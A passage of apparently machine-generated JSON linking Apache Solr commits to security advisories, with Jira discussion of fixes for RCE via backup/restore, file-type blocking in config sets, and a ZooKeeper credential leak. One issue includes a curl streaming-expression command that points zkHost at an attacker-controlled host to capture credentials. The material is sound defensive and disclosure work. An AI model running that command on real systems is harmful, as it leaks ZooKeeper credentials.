door, so I think it needs to land both places anyway. Thanks for agreeing Jan. If you have time to review, I'll make it ready for commit and then do the regular main -> 9x -> 9.4.1 -> 8.11.3 workflow. The protected path feature can be added in the open, right, as it does not reveal any undisclosed CVE to anyone, it is just an additional hardening against potential future undiscovered attacks. I'll try to review PRs. Hmm I guess, its a different way of solving the same vulnerability, so I'm not sure it can be done openly. Happy to make a public JIRA/PR if y'all think its ok. Added more tests, and fixed something that the tests found. It should be close to ready I think. I'm trying to get up to speed on what's happening here and I'm confused. \u00a0If the problem relates to being able to tell Solr to backup stuff to locations that shouldn't be (i.e. to places inside Solr), can't we have a simple allowList approach? \u00a0Maybe the parent issue SOLR-16480 is what matters and not this backport one? \u00a0I see my \"slippery slope\" comment there and it really still resonates me... we are going down a slippery slope alright. I'd appreciate it if you would expand on \"slippery slope\" when you use that phrase. I don't think having a list of \"protected paths\" that don't allow writes is anything crazy. I also think limiting the file types that we allow in configSets is perfectly acceptable. I have no issue with also adding an \"allowList\" for backups. The big difference being that this is back-compat for good-faith users for 9x and 8.11, whereas allowList wouldn't be. The slippery slope is a cat & mouse game with someone who observes these... what I consider band-aids, and sees something we missed, and this continues. \u00a0If we protect certain paths but forget one, is that then CVE worthy? \u00a0I'd argue instead that we should require the installer user, the one who can configure solr.xml & startup, to choose the allowList paths that are okay. \u00a0A similar mindset for file extensions if we want to block based on them. RE back-combat; IMO it's reasonable to require that an upgrading user further specify certain startup/solr.xml options that didn't exist before, in the name of security. \u00a0Perhaps some good defaults could mean no action is necessary for some users. \u00a0Maybe \"/var\" is pre-approved. \u00a0Maybe furthermore we shouldn't load libs from a \"/var\" path unless the configuration is explicit about using such a path. \u00a0Just brainstorming a bit. I don't think it hurts to add multiple layers of security. However, the root cause of this issue is that it is even allowed to define a file-system backup outside of the \"location\" that is defined in solr.xml as the backup repository location, see https://solr.apache.org/guide/solr/latest/deployment-guide/backup-restore.html#localfilesystemrepository What if we modified the LocalFileSystemRepository to restrict the backup location to be within the statically configured location? Then attackers whould need to figure out how to add that admin-decided location to classpath, or to create a core inside that location. Or something else. <backup> <repository name= \"local_repo\" class= \"org.apache.solr.core.backup.repository.LocalFileSystemRepository\" > <str name= \"location\" > /solr/backup_data </str> </repository> </backup> If we protect certain paths but forget one, is that then CVE worthy? With two layers of protection, I think we'd be pretty safe from having to issue another CVE, but obviously there is always the possibility. I'd argue instead that we should require the installer user, the one who can configure solr.xml & startup, to choose the allowList paths that are okay. The \"allowBackupPath\" you suggest is really close to the \"allowPaths\" logic we already have, however it really just adds \"SOLR_HOME\", \"SOLR_DATA_HOME\" and \"coreRootDirectory\". \"SOLR_DATA_HOME\" is fine, no libraries are loaded from there. \"SOLR_HOME\" has \"SOLR_HOME/lib\" and \"coreRootDirectory\" has \"coreRootDirectory/lib\". Lastly, \"sharedLib\" might be included under \"allowPaths\", so we can forbid that just for the sake of being cautious. The other logic in the protections merely exist to be extra cautious. Basically this is one less configuration a user needs to care about, but adds extra checks to make sure they can't shoot themselves in the foot. (e.g. even if the \"allowBackupPath\" option existed, they could set it to a folder that included their SOLR_HOME, which would make them vulnerable) That's basically what this PR is, although extra protected paths have been added just to be extra cautious RE back-combat; IMO it's reasonable to require that an upgrading user further specify certain startup/solr.xml options that didn't exist before, in the name of security. I agree for a minor version, but this would be a fairly big change for users in a patch change, especially when there are options that aren't back-compat breaking. Users using an \"8.11\" docker image, to auto-receive security updates, would see their backups start failing automatically. Perhaps some good defaults could mean no action is necessary for some users. \u00a0Maybe \"/var\" is pre-approved. I don't like the ideas of defaults when Solr has no guidelines for how a filesystem should be setup. Using \"/var\" as a default wouldn't work because the SOLR_HOME/lib and SOLR_CORE/lib could easily be under \"/var\", like they are in the Docker image. Looks good Jan. And maybe the \"slipper slope\" metaphor isn't the right metaphor Jan, I think making the location required going forward is a good idea. And all paths provided in the API would need to be relative to that location (without \"../\"). But I think for 8.11 at least (and probably 9.4.1), we would need to protect without making \"location\" mandatory. (As I've mentioned before). Did some basic cleanup of the 8.11 patch, added some javadoc, when traversing folders, skip only \".\" and \"..\", not every folder starting with a \".\". Ran \"ant precommit\". Do you have a suggestion for CHANGES.txt entry and JIRA number to use? Looks good to me Jan. I would use this JIRA. And something simple like \"Restrict certain file types from being uploaded with or downloaded from Config Sets.\" Pushed to branch_8_11 in https://github.com/apache/lucene-solr/commit/7e9a2e67f812032a049836c3aa0b18bf5cd717f9 I have updated the patch for main branch with latest updates from 8.11 patch: SOLR-16949.patch Precommit passes and I am ready to merge. Do we want to avoid the extra publicity that a PR gives, by pushing directly from the command line? If so, I'm grateful for a patch review of the updated patch. Note: I kept the patch from SOLR-16480 intact, but we could do another JIRA to remove that filename-suffix feature from main branch after this has landed. That patch for main looks good to me Jan, I would push directly to main (and backport of course) without PRs. As for SOLR-16480 , I do think we should have a Jira to remove that in main, after this has landed. main: https://github.com/apache/solr/commit/15534754f492079e52288dd11abaf1c4261b3ea4 branch_9x: https://github.com/apache/solr/commit/644dd3a6d6780d71030f7070754d2f3adce22859 branch_9_4: https://github.com/apache/solr/commit/ad6854b04361e351e08aa8f39fb7ff0e8fedc9a2 There's some local (and Jenkins) test failures that look related to this change, particularly in TestConfigSetService and TestFileSystemConfigSetService. See this Jenkins build for an example.  (I've also attached the Jenkins logs, so they're preserved after our build-retention rolls over.) jenkins.log.txt.gz At a glance it looks like the problem is that this change introduces some InputStream leaks ] in our ConfigSet code.  Seems like a simple-ish fix?  I suspect one of you guys might already be aware of this and working on a fix, and I don't want to duplicate effort.  But if you aren't already on it, lmk and I can toss a fix together. Yea, looks like some careless stream handling there. Taking a look. Fix in SOLR-16949-inputstream-leaks.patch . This patch passes Path objects instead of InputStream and also uses the File and byte[] methods of SimpleMagic library instead of always converting to InputStream. Also streamlines tests with try-with-resources. I ran the entire test suite locally, so committed right away: main: https://github.com/apache/solr/commit/c89813a675663bb82f18236840b2a84cac05e1ee branch_9x: https://github.com/apache/solr/commit/c79011e81dada2f9bc4b4df32ffb32152ef81152 branch_9_4: https://github.com/apache/solr/commit/ce2813c97f70b5e83ece80455aad74a1fd7eeca6 A belated LGTM on the resource-leak fix; thanks Jan! Yep, looks good. Doesn't look like branch_8_11 code is directly using the same code, except some tests that may be leaking streams. I'll have a look at pushing a patch to that branch too. Backport of inputstream handling to branch_8_11: https://github.com/apache/lucene-solr/commit/6c8f24eb9e3fe1cb19058173f2e221de3febfeda Closing after the 9.4.1 release"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "COMMIT_IS_SECURITY_RELEVANT",
                    "message": "",
                    "relevance": 32
                },
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-16949",
                    "relevance": 32
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: ZooKeeper, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/ivy.xml, solr/core/src/java/org/apache/solr/util/SolrCLI.java, solr/solrj/src/java/org/apache/solr/common/cloud/ZkMaintenanceUtils.java, solr/core/src/resources/magic/executables, solr/core/src/java/org/apache/solr/core/backup/BackupManager.java, solr/core/src/test-files/magic/HelloWorldJavaClass.class.bin, solr/core/src/test-files/magic/hello.tar.bin, solr/licenses/simplemagic-1.17.jar.sha1, solr/core/src/java/org/apache/solr/util/FileTypeMagicUtil.java, solr/core/src/java/org/apache/solr/handler/admin/ConfigSetsHandler.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16949 contains some security-related terms: hardening, security, vulnerable, rce",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: version, handler",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16949",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "6e2272c4ccc3513d452a4f6bf6dc9c37a344e71c",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1683739618,
            "hunks": 38,
            "message": "SOLR-14853: enableRemoteStreaming and enableStreamBody are now global (#1615) Env vars: SOLR_ENABLE_REMOTE_STREAMING and SOLR_ENABLE_STREAM_BODY Sys props: solr.enableRemoteStreaming and solr.enableStreamBody solrconfig.xml (including via config-edit API) are now no-op; log a warning. Backwards incompatible but easy to comply. Co-authored-by: Jan H\u00c3\u00b8ydahl <janhoy@users.noreply.github.com> --------- Signed-off-by: Jan H\u00c3\u00b8ydahl <janhoy@users.noreply.github.com> Co-authored-by: Jan H\u00c3\u00b8ydahl <janhoy@users.noreply.github.com>",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/core/SolrConfig.java",
                "solr/core/src/java/org/apache/solr/handler/DumpRequestHandler.java",
                "solr/core/src/java/org/apache/solr/servlet/SolrRequestParsers.java",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-analytics-query.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-collapseqparser.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-components-name.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-delaying-component.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-doctransformers.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-elevate.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-follower.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-follower1.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-hash.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-leader-throttled.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-leader.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-leader1-keepOneBackup.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-leader1.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-leader2.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-leader3.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-managed-schema.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-minhash.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-nocache.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-plugcollector.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-repeater.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-replication-legacy.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-schemaless.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-sql.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig-tlog.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig.xml",
                "solr/core/src/test-files/solr/collection1/conf/solrconfig_perf.xml",
                "solr/core/src/test-files/solr/crazy-path-to-config.xml"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-14853": "The enableRemoteStreaming option is a security risk, and so it's off by default. https://lucene.apache.org/solr/guide/8_6/content-streams.html It seems strange that an option like this is declared in solrconfig.xml (a part of the configSet) instead of being a global option.  For example enable.dih.dataConfigParam is a System property.  I think it's a bit of a stretch to want only some configSets to use this but not others. Make enableRemoteStreaming option global; not configSet Commit ffedc5bb680e26e48f04899aff4ff3ced7e7c143 in solr's branch refs/heads/main from David Smiley [ https://gitbox.apache.org/repos/asf?p=solr.git;h=ffedc5bb680 ] SOLR-14853 : enableRemoteStreaming and enableStreamBody are now global (#1615) Env vars: SOLR_ENABLE_REMOTE_STREAMING and SOLR_ENABLE_STREAM_BODY Sys props: solr.enableRemoteStreaming and solr.enableStreamBody solrconfig.xml (including via config-edit API) are now no-op; log a warning. Backwards incompatible but easy to comply. Co-authored-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> --------- Signed-off-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> Co-authored-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> Commit 84ac989e5b2358f0c9db8fd4fbc5c5d8785e6e1c in solr's branch refs/heads/branch_9x from David Smiley [ https://gitbox.apache.org/repos/asf?p=solr.git;h=84ac989e5b2 ] SOLR-14853 : enableRemoteStreaming and enableStreamBody are now global (#1615) Env vars: SOLR_ENABLE_REMOTE_STREAMING and SOLR_ENABLE_STREAM_BODY Sys props: solr.enableRemoteStreaming and solr.enableStreamBody solrconfig.xml (including via config-edit API) are now no-op; log a warning. Backwards incompatible but easy to comply. Co-authored-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> --------- Signed-off-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> Co-authored-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> Closing after the 9.3.0 release Commit 6e2272c4ccc3513d452a4f6bf6dc9c37a344e71c in lucene-solr's branch refs/heads/branch_8_11 from David Smiley [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=6e2272c4ccc ] SOLR-14853 : enableRemoteStreaming and enableStreamBody are now global (#1615) Env vars: SOLR_ENABLE_REMOTE_STREAMING and SOLR_ENABLE_STREAM_BODY Sys props: solr.enableRemoteStreaming and solr.enableStreamBody solrconfig.xml (including via config-edit API) are now no-op; log a warning. Backwards incompatible but easy to comply. Co-authored-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> --------- Signed-off-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> Co-authored-by: Jan H\u00f8ydahl <janhoy@users.noreply.github.com> Commit 1e5c88cbed0d7f6a5bb873d851bd58f003b94399 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=1e5c88cbed0 ] SOLR-14853 : Fix LTR test failures See dev list thread \"Sv: enableRemoteStreaming+enableStreamBody-change in Solr 8.11.3\" . Need edits to RefGuide: \"Major changes in 8.11\" section as well as anywhere else mentioning old solrconfig.xml configuration of this."
            },
            "ghissue_refs": {
                "1615": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/test-files/solr/collection1/conf/solrconfig-analytics-query.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-schemaless.xml, solr/core/src/java/org/apache/solr/servlet/SolrRequestParsers.java, solr/core/src/test-files/solr/collection1/conf/solrconfig-hash.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-repeater.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig_perf.xml, solr/core/src/java/org/apache/solr/handler/DumpRequestHandler.java, solr/core/src/test-files/solr/collection1/conf/solrconfig-leader.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-leader3.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-doctransformers.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-nocache.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-leader1.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-follower1.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-managed-schema.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-leader-throttled.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-sql.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-minhash.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-plugcollector.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-elevate.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-leader2.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-delaying-component.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-tlog.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-collapseqparser.xml, solr/core/src/java/org/apache/solr/core/SolrConfig.java, solr/core/src/test-files/solr/collection1/conf/solrconfig-replication-legacy.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-follower.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-leader1-keepOneBackup.xml, solr/core/src/test-files/solr/crazy-path-to-config.xml, solr/core/src/test-files/solr/collection1/conf/solrconfig-components-name.xml",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-14853 contains some security-related terms: security",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: streaming, stream, user",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler, request",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-14853",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 1615",
                    "relevance": 2
                },
                {
                    "id": "COMMIT_IS_SECURITY_RELEVANT",
                    "message": "",
                    "relevance": 32
                }
            ]
        },
        {
            "commit_id": "f13b6738b5b8888023dc760801b9436ee30429c5",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1705099656,
            "hunks": 3,
            "message": "SOLR-17098: Fix some test issues",
            "changed_files": [
                "solr/solrj/src/java/org/apache/solr/client/solrj/io/SolrClientCache.java",
                "solr/solrj/src/test-files/solrj/solr/solr.xml"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-17098": "Security list thread: https://lists.apache.org/thread/byrxkqk15mh6960wmx4r851srosgkvbh ZK Credentials and ACLs can be exposed to any endpoint when the Streaming Handler is used: curl --data-urlencode 'expr=search(collection1, zkHost=\"target:2121\", qt=\"/export\", q=\" : \", fl=\"id,a_s,a_i,a_f\", sort=\"a_f asc, a_i asc\")' http://localhost:8983/solr/demo/stream In the command above, if the Solr instance has any Zookeeper Credentials or ACLs provided, then that information will be sent to the \"target:2121\" address. An attacker could set up a mock Zookeeper service to obtain the credentials, and then gain access to the Solr's Zookeeper Nodes. Zookeeper Credential Information Disclosure bug via Streaming Expressions Have a patch ready to test out. It works across all uses of the SolrClientCache, so hopefully there won't be any gaps we need to plugin in the future. Thanks for working on this!  Feel free to at-mention me next time.  I would have responded earlier in the month. I applied the patch to IntelliJ and also ran the tests via Crave CLI invocation (all passed; 6m 43sec) CloudSolrStream: you initialize ignoreZkACLs boolean but never use it (thanks IntelliJ for pointing this out) TupleStream: can remove your only edit; it was just for a newline SolrClientCache: here you used zkHost::contains but shouldn't this be zkHost::equals ?  Should match the host exactly, not partially. Thanks for finding the first two, removed both as they were from earlier implementations. The SolrClientCache used contains to make sure that other chRoots could still use the ACLs, because that's not a security issue. However yeah contains was the wrong way to do it. I changed it to \"equals\" after removing chRoots. New patch should be good to go? This works.  +1 In retrospect, I don't love that this approach introduces ignoreZkACLs in a number of places; it takes some review to understand what's going on and it seems yet another small wrinkle of complexity on things.  It's an exotic option. An alternative approach is to try to isolate the entire change to SolrZkClient.createZkCredentialsToAddAutomatically, where zkCredentialsProvider is loaded and is itself an exotic option as well.  The zkServer would be passed in to that method.  But it's unclear how that method would know if the zkServer is the one (or ones?) to which the zkCredentialsProvider applies.  So a half-baked idea.  Maybe it would require whatever the sys prop that identifies ZK being set and equivalent to the arg. Perhaps ZkCredentialsInjector's API (or its collaborator APIs) are missing an argument that ought to be there \u2013 the zkServer. Any way I did +1. Yeah unfortunately all of the ZkCredentialsInjector stuff is a part of SolrJ-Zookeeper, and thus doesn't really have any knowledge of the Solr Core's Zookeeper address. So we'd have to pass through that info anyways. I'll move forward so this won't block the patch releases, we can always improve it in the future. houston , anything needed to get this over the finish line?  This is the only block for 9.4.1 https://issues.apache.org/jira/issues/?jql=project%20%3D%20SOLR%20AND%20resolution%20%3D%20Unresolved%20AND%20fixVersion%20%3D%209.4.1%20%20ORDER%20BY%20priority%20DESC%2C%20updated%20DESC This has been backported to 9.4.1, but it hasn't been backported to 8.11.3 yet, so it's not marked as Done. You should be good to move forward with 9.4.1 This has been backported to branch_8_11 now. All backporting should be done. Closing after the 9.4.1 release"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-17098",
                    "relevance": 32
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr, zkHost",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/solrj/src/java/org/apache/solr/client/solrj/io/SolrClientCache.java, solr/solrj/src/test-files/solrj/solr/solr.xml",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-17098 contains some security-related terms: security",
                    "relevance": 4
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: issue",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-17098",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "143fa6f09ac1679c690cd1657c81f87ba7f449b9",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1702480054,
            "hunks": 1,
            "message": "SOLR-16949: Tolerate null bytes / empty file",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/util/FileTypeMagicUtil.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16949": "Before an 8.11.3 release, https://issues.apache.org/jira/browse/SOLR-16480 needs to be backported, thus creating this as a blocker. Here I am assuming that 8.x is vulnerable to the same attack, which should be investigated. RCE via Backup/Restore APIs - Fix for all file extensions See attached patch. It is not a back port of SOLR-16480 and is not for branch_8_11, but for main. It adds a file content MAGIC check for each location where we today call ZkMaintenanceUtils.isFileForbiddenInConfigSets() . I.e. it will peek inside each file and use \"libmagic\" style detection based on a config file in resources/magic folder. There exists thousands of matching rules for all kid of file formats (see https://github.com/file/file/tree/master/magic/Magdir ), but I copied rules for ZIP, TAR and CLASS, and made a simple regex rule for shell scripts. As an alternative to using the https://github.com/j256/simplemagic library (which is not super well maintained) would be to write our own detection rules in Java, which would not be too hard for JAR and CLASS which are the most important. This is definitely not a requirement for the change, but we should get rid of the file type extension stuff that I added in. Otherwise that looks like a really good patch, thanks for the awesome work here Jan! So we now have three options for safeguarding 8.11.3 against this attack: This patch (replacing filename suffix solution). It is way safer and I cannot think of a way an attacker could circumvent it, other than crafting a .jar or .class file that we cannot detect SOLR-16781 to feature toggle <lib> directives (keep old behavior by default) https://github.com/apache/solr/pull/2068 to feature toggle BACKUP to local file system (keep disabled by default) If we choose 1 we may not urgently need 2 or 3. But we may want to proceed with 2 for other reasons later. If we choose 2, we don't plug the hole by defualt but will need to document a recommendation to disable. If we choose 3 it will be a breaking change for users of BACKUP feature that needs to be documented. I choose Option 1 for all 8.11, 9.x, main Option 2 for 9.x, and remove <lib> in 10 If anyone wants to expedite this, feel free to grab this. I won't be able to continue until mid next week. > we should get rid of the file type extension stuff that I added in. Formally that cannot be removed until 10.0. We could document the deprecation of the extension feature together with this patch, and open a new Jira to remove the code in main. I won't be able to continue until mid next week. Would you be able to get to this soon? If so, I'll wait for you to get it in and then spin RC2. I can give backporting an attempt... Uploaded a patch for branch_8_11 SOLR-16949-8_11.patch It is based on the other patch, but with tweaks to make it fit the older codebase. As a workarodnd for the fact that the new FileTypeMagicUtil is in core and not in solrj, and therefore cannot be used by ZkMaintenanceUtils where we have methods like uploadToZK() and zkTransfer(), I added a check in SolrCLI before uploading a configset with either solr zk upconfig or solr create -c foo -d folder/. It is not perfect, but I did not want to introduce a new jar dependency to solrj, and I did not fancy writing the detectors myself. ichattopadhyaya please take it for a spin if you like. So with this we fail fast if the configSet contains a sh, zip, jar, tar or class file When uploading configset with bin/solr When uploading configset through configset API When doing backup of a collection (skip file and warn, not abort) When restoring a configset from a backup into zookeeper (skip file and warn, not abort) The patch contains some tests but not extensive integration tests here. I have run the entire test suite with ant. No refguide or CHANGES so far. When reviewing, pay special attention to Do we detect enough file tyes? Is the detection for each (especially jar) robust or can it be gamed? Should the backup/restore fail instead of just skip file and warn when an illegal file is detected? Try to customize solr.configset.upload.mimetypes.forbidden sysprop Based on review feedback I may help to refine a time or two before commit. Or feel free to revise the patch at your liking. When the 8.x patch is solid, we can update the main-branch patch with the latest changes. As a workarodnd for the fact that the new FileTypeMagicUtil is in core and not in solrj, and therefore cannot be used by ZkMaintenanceUtils where we have methods like uploadToZK() and zkTransfer(), I added a check in SolrCLI before uploading a configset with either solr zk upconfig or solr create -c foo -d folder/. It is not perfect, but I did not want to introduce a new jar dependency to solrj, and I did not fancy writing the detectors myself. This also requires direct access to ZooKeeper, so I'm not nearly as concerned. We can really only control the Solr ConfigSets API as well as any downloading of Zookeeper data to disk (Backups) Do we detect enough file tyes? Is the detection for each (especially jar) robust or can it be gamed? Maybe it would be helpful to add a second level of security here. Most of the places that would be dangerous to allow jars/class files to be backed up to are \"lib/\" directories. (/solr/lib, /solr/modules/<>/lib, /solr-home/lib, /solr-core/lib, etc) We could basically forbid saving anything to a \"lib\" folder, or to a known classloader folder (like shared-lib). Maybe it would be helpful to add a second level of security here. Most of the places that would be dangerous to allow jars/class files to be backed up to are \"lib/\" directories. (/solr/lib, /solr/modules/<>/lib, /solr-home/lib, /solr-core/lib, etc) We could basically forbid saving anything to a \"lib\" folder, or to a known classloader folder (like shared-lib). Ok I went ahead and tried this out, adding it as SOLR-16949 -main-protect-lib.patch This is independent of the other patch, but ultimately I think both should be merged. Thoughts? Thanks for review Houston. The protected lib technique is orthogonal and would definitely add another layer. Should that patch perhaps ripple down from main -> 9x -> 9.4.1 -> 8.11.3, or do\u00a0 you want to land it in 8.11.3 first? We urgently want to get 8.11.3 and 9.4.1 out the door, so I think it needs to land both places anyway. Thanks for agreeing Jan. If you have time to review, I'll make it ready for commit and then do the regular main -> 9x -> 9.4.1 -> 8.11.3 workflow. The protected path feature can be added in the open, right, as it does not reveal any undisclosed CVE to anyone, it is just an additional hardening against potential future undiscovered attacks. I'll try to review PRs. Hmm I guess, its a different way of solving the same vulnerability, so I'm not sure it can be done openly. Happy to make a public JIRA/PR if y'all think its ok. Added more tests, and fixed something that the tests found. It should be close to ready I think. I'm trying to get up to speed on what's happening here and I'm confused. \u00a0If the problem relates to being able to tell Solr to backup stuff to locations that shouldn't be (i.e. to places inside Solr), can't we have a simple allowList approach? \u00a0Maybe the parent issue SOLR-16480 is what matters and not this backport one? \u00a0I see my \"slippery slope\" comment there and it really still resonates me... we are going down a slippery slope alright. I'd appreciate it if you would expand on \"slippery slope\" when you use that phrase. I don't think having a list of \"protected paths\" that don't allow writes is anything crazy. I also think limiting the file types that we allow in configSets is perfectly acceptable. I have no issue with also adding an \"allowList\" for backups. The big difference being that this is back-compat for good-faith users for 9x and 8.11, whereas allowList wouldn't be. The slippery slope is a cat & mouse game with someone who observes these... what I consider band-aids, and sees something we missed, and this continues. \u00a0If we protect certain paths but forget one, is that then CVE worthy? \u00a0I'd argue instead that we should require the installer user, the one who can configure solr.xml & startup, to choose the allowList paths that are okay. \u00a0A similar mindset for file extensions if we want to block based on them. RE back-combat; IMO it's reasonable to require that an upgrading user further specify certain startup/solr.xml options that didn't exist before, in the name of security. \u00a0Perhaps some good defaults could mean no action is necessary for some users. \u00a0Maybe \"/var\" is pre-approved. \u00a0Maybe furthermore we shouldn't load libs from a \"/var\" path unless the configuration is explicit about using such a path. \u00a0Just brainstorming a bit. I don't think it hurts to add multiple layers of security. However, the root cause of this issue is that it is even allowed to define a file-system backup outside of the \"location\" that is defined in solr.xml as the backup repository location, see https://solr.apache.org/guide/solr/latest/deployment-guide/backup-restore.html#localfilesystemrepository What if we modified the LocalFileSystemRepository to restrict the backup location to be within the statically configured location? Then attackers whould need to figure out how to add that admin-decided location to classpath, or to create a core inside that location. Or something else. <backup> <repository name= \"local_repo\" class= \"org.apache.solr.core.backup.repository.LocalFileSystemRepository\" > <str name= \"location\" > /solr/backup_data </str> </repository> </backup> If we protect certain paths but forget one, is that then CVE worthy? With two layers of protection, I think we'd be pretty safe from having to issue another CVE, but obviously there is always the possibility. I'd argue instead that we should require the installer user, the one who can configure solr.xml & startup, to choose the allowList paths that are okay. The \"allowBackupPath\" you suggest is really close to the \"allowPaths\" logic we already have, however it really just adds \"SOLR_HOME\", \"SOLR_DATA_HOME\" and \"coreRootDirectory\". \"SOLR_DATA_HOME\" is fine, no libraries are loaded from there. \"SOLR_HOME\" has \"SOLR_HOME/lib\" and \"coreRootDirectory\" has \"coreRootDirectory/lib\". Lastly, \"sharedLib\" might be included under \"allowPaths\", so we can forbid that just for the sake of being cautious. The other logic in the protections merely exist to be extra cautious. Basically this is one less configuration a user needs to care about, but adds extra checks to make sure they can't shoot themselves in the foot. (e.g. even if the \"allowBackupPath\" option existed, they could set it to a folder that included their SOLR_HOME, which would make them vulnerable) That's basically what this PR is, although extra protected paths have been added just to be extra cautious RE back-combat; IMO it's reasonable to require that an upgrading user further specify certain startup/solr.xml options that didn't exist before, in the name of security. I agree for a minor version, but this would be a fairly big change for users in a patch change, especially when there are options that aren't 